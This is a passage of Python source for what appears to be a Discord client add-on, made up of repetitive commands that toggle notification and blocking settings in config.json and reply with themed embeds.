                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'DM deletion notifications `disabled`'
                await ctx.send(msg)
                
        set_vars()

        
    @React.command(usage="nnitroredeem", description="Toggles Nitro redeem Windows notifications")
    async def nnitroredeem(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['nitro_redeem_notify'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['nitro_redeem_notify'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Nitro Notifications', description='Nitro redeem notifications `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Nitro redeem notifications `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['nitro_redeem_notify'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['nitro_redeem_notify'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Nitro Notifications', description='Nitro redeem notifications `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Nitro redeem notifications `disabled`'
                await ctx.send(msg)
                
        set_vars()

    @React.command(usage="nnickname", description="Toggles Nickname updates detection Windows notifications")
    async def nnickname(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['nickname_update_notify'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['nickname_update_notify'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Nickname updates Notifications', description='Nickname updates notifications `enabled`',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)
                
        elif json.load(open('config.json', encoding='utf-8'))['nickname_update_notify'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['nickname_update_notify'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Nickname updates Notifications', description='Nickname updates notifications `disabled`',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)
                
        set_vars()
        
    @React.command(usage="nserverban", description="Toggles server ban Windows notifications")
    async def nserverban(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['server_ban_notify'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['server_ban_notify'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Server Ban Notifications', description='Server ban notifications `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Server ban notifications `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['server_ban_notify'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['server_ban_notify'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Server Ban Notifications', description='Server ban notifications `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Server ban notifications `disabled`'
                await ctx.send(msg)
                
        set_vars()

    @React.command(usage="ntickets", description="Toggles ticket detection Windows notifications")
    async def ntickets(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['ticket_notify'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['ticket_notify'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Ticket Notifications', description='Ticket notifications `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Ticket notifications `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['ticket_notify'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['ticket_notify'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Ticket Notifications', description='Ticket notifications `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Ticket notifications `disabled`'
                await ctx.send(msg)
                
        set_vars()
        

    @React.command(usage="nrelationships", description="Toggles relationship detection Windows notifications")
    async def nrelationships(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['relationship_notify'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['relationship_notify'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Relationship Notifications', description='Relationship notifications `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Relationship notifications `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['relationship_notify'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['relationship_notify'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Relationship Notifications', description='Relationship notifications `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Relationship notifications `disabled`'
                await ctx.send(msg)
                
        set_vars()

    @React.command(usage="nghostping", description="Toggles ghostping Windows notifications")
    async def nghostping(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['ghostping_notify'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['ghostping_notify'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Ghostping Notifications', description='Ghostping notifications `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Ghostping notifications `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['ghostping_notify'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['ghostping_notify'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Ghostping Notifications', description='Ghostping notifications `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Ghostping notifications `disabled`'
                await ctx.send(msg)
                
        set_vars()

    @React.command(usage="nroleupdates", description="Toggles role updates detection Windows notifications")
    async def nroleupdates(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['role_update_notify'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['role_update_notify'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Role Update Notifications', description='Role update notifications `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Role Update notifications `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['role_update_notify'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['role_update_notify'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Role Update Notifications', description='Role update notifications `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Role Update notifications `disabled`'
                await ctx.send(msg)
                
        set_vars()
        
    @React.command(usage="blockincomingfriends", description="Toggle blocking incoming friend requests (useful when getting massfriendrequested)")
    async def blockincomingfriends(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['block_incoming_friends'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['block_incoming_friends'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Block Incoming Friends', description='Blocking incoming friends `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Block Incoming Friends `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['block_incoming_friends'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['block_incoming_friends'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Block Incoming Friends', description='Blocking incoming friends `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Block Incoming Friends `disabled`'
                await ctx.send(msg)
                
        set_vars()
        
    @React.command(usage="blockdms", description="Toggle blocking incoming DMs (useful when getting massdmed)")
    async def blockdms(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['block_dms'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['block_dms'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Block DMs', description='Blocking DMs `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Block Incoming Friends `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['block_dms'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['block_dms'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Block DMs', description='Blocking DMs `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
